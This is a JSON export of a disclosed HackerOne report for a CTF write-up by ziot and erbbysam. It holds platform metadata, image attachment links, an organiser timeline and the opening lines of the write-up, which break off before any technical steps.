{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2018-09-30T21:28:47.725Z", 
    "voters": [
        "ziot", 
        "spam404", 
        "hackerhero", 
        "0xacb", 
        "eveeez", 
        "mygf", 
        "japz", 
        "den1al", 
        "mah1ndra", 
        "cryptographer", 
        "and 6 more..."
    ], 
    "facebook_team?": false, 
    "has_bounty?": false, 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 415137, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2018-10-22T16:01:45.154Z", 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "H1-5411 CTF Write-up by erbbysam and ziot", 
    "is_member_of_team?": null, 
    "vote_count": 16, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2018-10-30T21:28:47.783Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "attachments": [
        {
            "file_name": "2.png", 
            "type": "image/png", 
            "id": 351664, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/351/664/6fb7fc5a733375ed3059a4ca06ebca9be91775e0/2.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUGLJGSWG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221524Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA4aDKM0VlUhdMTH8KoEtCK3A8OYEaI0bxYq7BUbrfF29DSbKtUs5TMCeB5FlkwERpxSU49o20mRIVl2fBvvv1hdFcsCDANAMGWvX%2Faf68iJ3aFPBQySWphheO3DX%2BSZQciRkV0sOPeKeZSt2y6M11j88wuo3HYsP7bIFtt2%2BUaL%2FIqfE8KHYavOS6uyUN0H%2BUfHDrW%2FgMpQ8XXLkiFuG8%2BV2DdqfYc9V22I7shRDODxACEfjFPInrTKfLh74T1aVBNswXALPhKClZRFi6kUPozhrj8qXpOmsge18GAMHYHGjpEpasUVrJ2earHh6ttt3se0%2B%2BTASgDPlAxRdaKGq%2FWME7DbyKdQ2N4%2Bn0WCbl%2B0ZnuTw2IbHnGas%2FTiYT%2BWSTw07tDag6vX9fCs8FhCTE2lNNu59CQkorthuaPzTq9TQBE%2BefkD4NqWd8XIe70sIzW5Gov9hArx5yoFxMyl981yHwhHBoDQTx%2BBp4Y%2BoteeWjmi0xzjtDZHW88%2FeYX17nsF3vaqAoUkelgW7kpUm8mv2yKfyt2PFpmsLyuEHv%2BEhiSjd75eU3JKoY5TjaeO1Z0pj3qT9jWAnTt%2B4p6EhH6lW6wtMSnxwfoogZym4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=52a9694e64ccdba550d3563c4cf0423267a6ff299e8d857f240a85decd80f588"
        }, 
        {
            "file_name": "1.png", 
            "type": "image/png", 
            "id": 351665, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/351/665/a40ac6adfedccee7f06cbab896f630fd102ccd38/1.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUGLJGSWG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221524Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA4aDKM0VlUhdMTH8KoEtCK3A8OYEaI0bxYq7BUbrfF29DSbKtUs5TMCeB5FlkwERpxSU49o20mRIVl2fBvvv1hdFcsCDANAMGWvX%2Faf68iJ3aFPBQySWphheO3DX%2BSZQciRkV0sOPeKeZSt2y6M11j88wuo3HYsP7bIFtt2%2BUaL%2FIqfE8KHYavOS6uyUN0H%2BUfHDrW%2FgMpQ8XXLkiFuG8%2BV2DdqfYc9V22I7shRDODxACEfjFPInrTKfLh74T1aVBNswXALPhKClZRFi6kUPozhrj8qXpOmsge18GAMHYHGjpEpasUVrJ2earHh6ttt3se0%2B%2BTASgDPlAxRdaKGq%2FWME7DbyKdQ2N4%2Bn0WCbl%2B0ZnuTw2IbHnGas%2FTiYT%2BWSTw07tDag6vX9fCs8FhCTE2lNNu59CQkorthuaPzTq9TQBE%2BefkD4NqWd8XIe70sIzW5Gov9hArx5yoFxMyl981yHwhHBoDQTx%2BBp4Y%2BoteeWjmi0xzjtDZHW88%2FeYX17nsF3vaqAoUkelgW7kpUm8mv2yKfyt2PFpmsLyuEHv%2BEhiSjd75eU3JKoY5TjaeO1Z0pj3qT9jWAnTt%2B4p6EhH6lW6wtMSnxwfoogZym4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d3727d7ea56d3662ce4eb40ec6b476b8196443e46f4c4afb564c63888896e420"
        }, 
        {
            "file_name": "3.png", 
            "type": "image/png", 
            "id": 351666, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/351/666/2e7ed210aa52547c39938e02d21fc403eb80f610/3.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUGLJGSWG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221524Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA4aDKM0VlUhdMTH8KoEtCK3A8OYEaI0bxYq7BUbrfF29DSbKtUs5TMCeB5FlkwERpxSU49o20mRIVl2fBvvv1hdFcsCDANAMGWvX%2Faf68iJ3aFPBQySWphheO3DX%2BSZQciRkV0sOPeKeZSt2y6M11j88wuo3HYsP7bIFtt2%2BUaL%2FIqfE8KHYavOS6uyUN0H%2BUfHDrW%2FgMpQ8XXLkiFuG8%2BV2DdqfYc9V22I7shRDODxACEfjFPInrTKfLh74T1aVBNswXALPhKClZRFi6kUPozhrj8qXpOmsge18GAMHYHGjpEpasUVrJ2earHh6ttt3se0%2B%2BTASgDPlAxRdaKGq%2FWME7DbyKdQ2N4%2Bn0WCbl%2B0ZnuTw2IbHnGas%2FTiYT%2BWSTw07tDag6vX9fCs8FhCTE2lNNu59CQkorthuaPzTq9TQBE%2BefkD4NqWd8XIe70sIzW5Gov9hArx5yoFxMyl981yHwhHBoDQTx%2BBp4Y%2BoteeWjmi0xzjtDZHW88%2FeYX17nsF3vaqAoUkelgW7kpUm8mv2yKfyt2PFpmsLyuEHv%2BEhiSjd75eU3JKoY5TjaeO1Z0pj3qT9jWAnTt%2B4p6EhH6lW6wtMSnxwfoogZym4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=fdcd2325b690da211fc79ce19b9658a1eb588e37aa705de8666f0d8f2e3f98b5"
        }, 
        {
            "file_name": "4.png", 
            "type": "image/png", 
            "id": 351667, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/351/667/a291bbc74a7310fcf12d193134a23973f287dbec/4.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUGLJGSWG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221524Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA4aDKM0VlUhdMTH8KoEtCK3A8OYEaI0bxYq7BUbrfF29DSbKtUs5TMCeB5FlkwERpxSU49o20mRIVl2fBvvv1hdFcsCDANAMGWvX%2Faf68iJ3aFPBQySWphheO3DX%2BSZQciRkV0sOPeKeZSt2y6M11j88wuo3HYsP7bIFtt2%2BUaL%2FIqfE8KHYavOS6uyUN0H%2BUfHDrW%2FgMpQ8XXLkiFuG8%2BV2DdqfYc9V22I7shRDODxACEfjFPInrTKfLh74T1aVBNswXALPhKClZRFi6kUPozhrj8qXpOmsge18GAMHYHGjpEpasUVrJ2earHh6ttt3se0%2B%2BTASgDPlAxRdaKGq%2FWME7DbyKdQ2N4%2Bn0WCbl%2B0ZnuTw2IbHnGas%2FTiYT%2BWSTw07tDag6vX9fCs8FhCTE2lNNu59CQkorthuaPzTq9TQBE%2BefkD4NqWd8XIe70sIzW5Gov9hArx5yoFxMyl981yHwhHBoDQTx%2BBp4Y%2BoteeWjmi0xzjtDZHW88%2FeYX17nsF3vaqAoUkelgW7kpUm8mv2yKfyt2PFpmsLyuEHv%2BEhiSjd75eU3JKoY5TjaeO1Z0pj3qT9jWAnTt%2B4p6EhH6lW6wtMSnxwfoogZym4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5848f45532714f22dbe1c656768f0e9ab7fad6e6e06b8ed2d44f41ce2a9992da"
        }, 
        {
            "file_name": "5.png", 
            "type": "image/png", 
            "id": 351668, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/351/668/efc5a86760d1e6d939cdf5283d308da9f3715c3c/5.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUGLJGSWG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221524Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA4aDKM0VlUhdMTH8KoEtCK3A8OYEaI0bxYq7BUbrfF29DSbKtUs5TMCeB5FlkwERpxSU49o20mRIVl2fBvvv1hdFcsCDANAMGWvX%2Faf68iJ3aFPBQySWphheO3DX%2BSZQciRkV0sOPeKeZSt2y6M11j88wuo3HYsP7bIFtt2%2BUaL%2FIqfE8KHYavOS6uyUN0H%2BUfHDrW%2FgMpQ8XXLkiFuG8%2BV2DdqfYc9V22I7shRDODxACEfjFPInrTKfLh74T1aVBNswXALPhKClZRFi6kUPozhrj8qXpOmsge18GAMHYHGjpEpasUVrJ2earHh6ttt3se0%2B%2BTASgDPlAxRdaKGq%2FWME7DbyKdQ2N4%2Bn0WCbl%2B0ZnuTw2IbHnGas%2FTiYT%2BWSTw07tDag6vX9fCs8FhCTE2lNNu59CQkorthuaPzTq9TQBE%2BefkD4NqWd8XIe70sIzW5Gov9hArx5yoFxMyl981yHwhHBoDQTx%2BBp4Y%2BoteeWjmi0xzjtDZHW88%2FeYX17nsF3vaqAoUkelgW7kpUm8mv2yKfyt2PFpmsLyuEHv%2BEhiSjd75eU3JKoY5TjaeO1Z0pj3qT9jWAnTt%2B4p6EhH6lW6wtMSnxwfoogZym4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=fdc0e108d524e9c8cc98728634ac36357a4ff8c94aff60b38a9d23c7b5aa437e"
        }, 
        {
            "file_name": "6.png", 
            "type": "image/png", 
            "id": 351669, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/351/669/85367697b0b17ac29b532ff9ec393fa25d0d72ed/6.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUGLJGSWG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221524Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA4aDKM0VlUhdMTH8KoEtCK3A8OYEaI0bxYq7BUbrfF29DSbKtUs5TMCeB5FlkwERpxSU49o20mRIVl2fBvvv1hdFcsCDANAMGWvX%2Faf68iJ3aFPBQySWphheO3DX%2BSZQciRkV0sOPeKeZSt2y6M11j88wuo3HYsP7bIFtt2%2BUaL%2FIqfE8KHYavOS6uyUN0H%2BUfHDrW%2FgMpQ8XXLkiFuG8%2BV2DdqfYc9V22I7shRDODxACEfjFPInrTKfLh74T1aVBNswXALPhKClZRFi6kUPozhrj8qXpOmsge18GAMHYHGjpEpasUVrJ2earHh6ttt3se0%2B%2BTASgDPlAxRdaKGq%2FWME7DbyKdQ2N4%2Bn0WCbl%2B0ZnuTw2IbHnGas%2FTiYT%2BWSTw07tDag6vX9fCs8FhCTE2lNNu59CQkorthuaPzTq9TQBE%2BefkD4NqWd8XIe70sIzW5Gov9hArx5yoFxMyl981yHwhHBoDQTx%2BBp4Y%2BoteeWjmi0xzjtDZHW88%2FeYX17nsF3vaqAoUkelgW7kpUm8mv2yKfyt2PFpmsLyuEHv%2BEhiSjd75eU3JKoY5TjaeO1Z0pj3qT9jWAnTt%2B4p6EhH6lW6wtMSnxwfoogZym4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f333bff6a80c7a9bc019c028c68011022f3e94ad7f2ce1b9a26963d8c17a35f3"
        }, 
        {
            "file_name": "7.png", 
            "type": "image/png", 
            "id": 351670, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/351/670/1c866307f6ac4e9bf878292a52a024281e2439b5/7.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUGLJGSWG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221524Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA4aDKM0VlUhdMTH8KoEtCK3A8OYEaI0bxYq7BUbrfF29DSbKtUs5TMCeB5FlkwERpxSU49o20mRIVl2fBvvv1hdFcsCDANAMGWvX%2Faf68iJ3aFPBQySWphheO3DX%2BSZQciRkV0sOPeKeZSt2y6M11j88wuo3HYsP7bIFtt2%2BUaL%2FIqfE8KHYavOS6uyUN0H%2BUfHDrW%2FgMpQ8XXLkiFuG8%2BV2DdqfYc9V22I7shRDODxACEfjFPInrTKfLh74T1aVBNswXALPhKClZRFi6kUPozhrj8qXpOmsge18GAMHYHGjpEpasUVrJ2earHh6ttt3se0%2B%2BTASgDPlAxRdaKGq%2FWME7DbyKdQ2N4%2Bn0WCbl%2B0ZnuTw2IbHnGas%2FTiYT%2BWSTw07tDag6vX9fCs8FhCTE2lNNu59CQkorthuaPzTq9TQBE%2BefkD4NqWd8XIe70sIzW5Gov9hArx5yoFxMyl981yHwhHBoDQTx%2BBp4Y%2BoteeWjmi0xzjtDZHW88%2FeYX17nsF3vaqAoUkelgW7kpUm8mv2yKfyt2PFpmsLyuEHv%2BEhiSjd75eU3JKoY5TjaeO1Z0pj3qT9jWAnTt%2B4p6EhH6lW6wtMSnxwfoogZym4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=488c2ab368505f8acc9b317377c4698643f00a7ddd392be4b2f3bb4ff14966f1"
        }, 
        {
            "file_name": "8.png", 
            "type": "image/png", 
            "id": 351671, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/351/671/a04f227f9867ec5a02c85c4ee027319d228044a8/8.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUGLJGSWG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221524Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA4aDKM0VlUhdMTH8KoEtCK3A8OYEaI0bxYq7BUbrfF29DSbKtUs5TMCeB5FlkwERpxSU49o20mRIVl2fBvvv1hdFcsCDANAMGWvX%2Faf68iJ3aFPBQySWphheO3DX%2BSZQciRkV0sOPeKeZSt2y6M11j88wuo3HYsP7bIFtt2%2BUaL%2FIqfE8KHYavOS6uyUN0H%2BUfHDrW%2FgMpQ8XXLkiFuG8%2BV2DdqfYc9V22I7shRDODxACEfjFPInrTKfLh74T1aVBNswXALPhKClZRFi6kUPozhrj8qXpOmsge18GAMHYHGjpEpasUVrJ2earHh6ttt3se0%2B%2BTASgDPlAxRdaKGq%2FWME7DbyKdQ2N4%2Bn0WCbl%2B0ZnuTw2IbHnGas%2FTiYT%2BWSTw07tDag6vX9fCs8FhCTE2lNNu59CQkorthuaPzTq9TQBE%2BefkD4NqWd8XIe70sIzW5Gov9hArx5yoFxMyl981yHwhHBoDQTx%2BBp4Y%2BoteeWjmi0xzjtDZHW88%2FeYX17nsF3vaqAoUkelgW7kpUm8mv2yKfyt2PFpmsLyuEHv%2BEhiSjd75eU3JKoY5TjaeO1Z0pj3qT9jWAnTt%2B4p6EhH6lW6wtMSnxwfoogZym4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b07d11247de59c76a4908d9a8280c42c7c471082ba6eb7ac94253f2d9367a14b"
        }
    ], 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2018-09-27T00:15:27.879Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-09-27T00:15:27.879Z", 
            "actor": {
                "username": "ziot", 
                "url": "/ziot", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/262/577992223835ccbaf01fed0b39c9e7e581ea7450_medium.jpg?1517000974"
                }, 
                "hackerone_triager": false
            }, 
            "email": "erbbysam", 
            "team_handle": "h1-5411-ctf", 
            "message": null, 
            "markdown_message": "", 
            "type": "Activities::ReportCollaboratorInvited", 
            "id": 3395130, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-09-27T00:45:41.664Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-09-27T00:45:41.664Z", 
            "actor": {
                "username": "erbbysam", 
                "url": "/erbbysam", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "h1-5411-ctf", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportCollaboratorJoined", 
            "id": 3395187, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-09-28T00:42:46.073Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-09-28T00:42:46.073Z", 
            "actor": {
                "username": "corb3nik", 
                "url": "/corb3nik", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/014/357/8ca06d363012089c6918e2502b22666b73815e47_medium.png?1539386593"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "h1-5411-ctf", 
            "message": "Hello @ziot and @erbbysam! Thanks for participating and congratulations! Amazing job on solving the CTF. Since you're not in Buenos Aires we'll close it as resolved.", 
            "markdown_message": "<p>Hello <a href=\"/ziot\">@ziot</a> and <a href=\"/erbbysam\">@erbbysam</a>! Thanks for participating and congratulations! Amazing job on solving the CTF. Since you&#39;re not in Buenos Aires we&#39;ll close it as resolved.</p>\n", 
            "type": "Activities::Comment", 
            "id": 3399675, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-09-28T00:43:05.448Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-09-28T00:43:05.448Z", 
            "actor": {
                "username": "corb3nik", 
                "url": "/corb3nik", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/014/357/8ca06d363012089c6918e2502b22666b73815e47_medium.png?1539386593"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "h1-5411-ctf", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BugTriaged", 
            "id": 3399678, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "ziot", 
                "url": "/ziot"
            }, 
            "created_at": "2018-09-28T00:43:30.412Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-09-28T00:43:30.412Z", 
            "actor": {
                "username": "corb3nik", 
                "url": "/corb3nik", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/014/357/8ca06d363012089c6918e2502b22666b73815e47_medium.png?1539386593"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "h1-5411-ctf", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BugResolved", 
            "id": 3399680, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-09-30T21:28:47.755Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-09-30T21:28:47.755Z", 
            "actor": {
                "username": "ziot", 
                "url": "/ziot", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/262/577992223835ccbaf01fed0b39c9e7e581ea7450_medium.jpg?1517000974"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "h1-5411-ctf", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 3410578, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-10-08T16:59:11.837Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-10-08T16:59:11.837Z", 
            "actor": {
                "username": "ziot", 
                "url": "/ziot", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/262/577992223835ccbaf01fed0b39c9e7e581ea7450_medium.jpg?1517000974"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "h1-5411-ctf", 
            "message": "https://buer.haus/2018/10/08/h1-5411-ctf-write-up-by-erbbysam-and-ziot/", 
            "markdown_message": "<p><a title=\"https://buer.haus/2018/10/08/h1-5411-ctf-write-up-by-erbbysam-and-ziot/\" href=\"/redirect?signature=fecdc22b03028c6bf0b0deee70086619b592d546&amp;url=https%3A%2F%2Fbuer.haus%2F2018%2F10%2F08%2Fh1-5411-ctf-write-up-by-erbbysam-and-ziot%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://buer.haus/2018/10/08/h1-5411-ctf-write-up-by-erbbysam-and-ziot/</span><i class=\"icon-external-link\"></i></a></p>\n", 
            "type": "Activities::Comment", 
            "id": 3449728, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-10-22T16:01:45.176Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-10-22T16:01:45.176Z", 
            "actor": {
                "username": "nahamsec", 
                "url": "/nahamsec", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/413/d2674e2e9e932d4a399a03176edca6b400a0c0d3_medium.png?1516918330"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "h1-5411-ctf", 
            "message": "We would like to publicly disclose your submission. Thanks again for participating in the MemeCTF Challenge. ", 
            "markdown_message": "<p>We would like to publicly disclose your submission. Thanks again for participating in the MemeCTF Challenge. </p>\n", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 3514750, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-10-22T16:01:45.239Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-10-22T16:01:45.239Z", 
            "actor": {
                "username": "nahamsec", 
                "url": "/nahamsec", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/413/d2674e2e9e932d4a399a03176edca6b400a0c0d3_medium.png?1516918330"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "h1-5411-ctf", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 3514751, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "ziot", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/ziot", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/003/262/9e21e996f78cee1b0dc6c64d52dcae32c51d8fc3_small.jpg?1517000974"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 72, 
        "name": "Resource Injection"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -3199596.484798236, 
    "disclosed_at": "2018-10-22T16:01:45.219Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/415137", 
    "created_at": "2018-09-27T00:05:41.201Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p><a href=\"/erbbysam\">@erbbysam</a> and I recently set out to beat the latest CTF challenge hosted by HackerOne. Here is a write-up with the process we took from start to finish.</p>\n\n<p>The h1-5411 CTF begins with a tweet from HackerOne:</p>\n\n<ul>\n<li><a title=\"https://twitter.com/Hacker0x01/status/1044974142150373378\" href=\"/redirect?signature=f7b4ad8db570f78e0371556d5974fe0e624b2a65&amp;url=https%3A%2F%2Ftwitter.com%2FHacker0x01%2Fstatus%2F1044974142150373378\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://twitter.com/Hacker0x01/status/1044974142150373378</span><i class=\"icon-external-link\"></i></a></li>\n</ul>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"1.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/351/665/a40ac6adfedccee7f06cbab896f630fd102ccd38/1.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQUGLJGSWG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221524Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDKM0VlUhdMTH8KoEtCK3A8OYEaI0bxYq7BUbrfF29DSbKtUs5TMCeB5FlkwERpxSU49o20mRIVl2fBvvv1hdFcsCDANAMGWvX%2Faf68iJ3aFPBQySWphheO3DX%2BSZQciRkV0sOPeKeZSt2y6M11j88wuo3HYsP7bIFtt2%2BUaL%2FIqfE8KHYavOS6uyUN0H%2BUfHDrW%2FgMpQ8XXLkiFuG8%2BV2DdqfYc9V22I7shRDODxACEfjFPInrTKfLh74T1aVBNswXALPhKClZRFi6kUPozhrj8qXpOmsge18GAMHYHGjpEpasUVrJ2earHh6ttt3se0%2B%2BTASgDPlAxRdaKGq%2FWME7DbyKdQ2N4%2Bn0WCbl%2B0ZnuTw2IbHnGas%2FTiYT%2BWSTw07tDag6vX9fCs8FhCTE2lNNu59CQkorthuaPzTq9TQBE%2BefkD4NqWd8XIe70sIzW5Gov9hArx5yoFxMyl981yHwhHBoDQTx%2BBp4Y%2BoteeWjmi0xzjtDZHW88%2FeYX17nsF3vaqAoUkelgW7kpUm8mv2yKfyt2PFpmsLyuEHv%2BEhiSjd75eU3JKoY5TjaeO1Z0pj3qT9jWAnTt%2B4p6EhH6lW6wtMSnxwfoogZym4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=d3727d7ea56d3662ce4eb40ec6b476b8196443e46f4c4afb564c63888896e420\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/351/665/a40ac6adfedccee7f06cbab896f630fd102ccd38/1.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQUGLJGSWG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221524Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDKM0VlUhdMTH8KoEtCK3A8OYEaI0bxYq7BUbrfF29DSbKtUs5TMCeB5FlkwERpxSU49o20mRIVl2fBvvv1hdFcsCDANAMGWvX%2Faf68iJ3aFPBQySWphheO3DX%2BSZQciRkV0sOPeKeZSt2y6M11j88wuo3HYsP7bIFtt2%2BUaL%2FIqfE8KHYavOS6uyUN0H%2BUfHDrW%2FgMpQ8XXLkiFuG8%2BV2DdqfYc9V22I7shRDODxACEfjFPInrTKfLh74T1aVBNswXALPhKClZRFi6kUPozhrj8qXpOmsge18GAMHYHGjpEpasUVrJ2earHh6ttt3se0%2B%2BTASgDPlAxRdaKGq%2FWME7DbyKdQ2N4%2Bn0WCbl%2B0ZnuTw2IbHnGas%2FTiYT%2BWSTw07tDag6vX9fCs8FhCTE2lNNu59CQkorthuaPzTq9TQBE%2BefkD4NqWd8XIe70sIzW5Gov9hArx5yoFxMyl981yHwhHBoDQTx%2BBp4Y%2BoteeWjmi0xzjtDZHW88%2FeYX17nsF3vaqAoUkelgW7kpUm8mv2yKfyt2PFpmsLyuEHv%2BEhiSjd75eU3JKoY5TjaeO1Z0pj3qT9jWAnTt%2B4p6EhH6lW6wtMSnxwfoogZym4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=d3727d7ea56d3662ce4eb40ec6b476b8196443e46f4c4afb564c63888896e420\" class=\"markdown-inline-image\"></a></p>\n\n<p>This leads to a website called the HackerOne Meme Generator:</p>\n\n<ul>\n<li><a 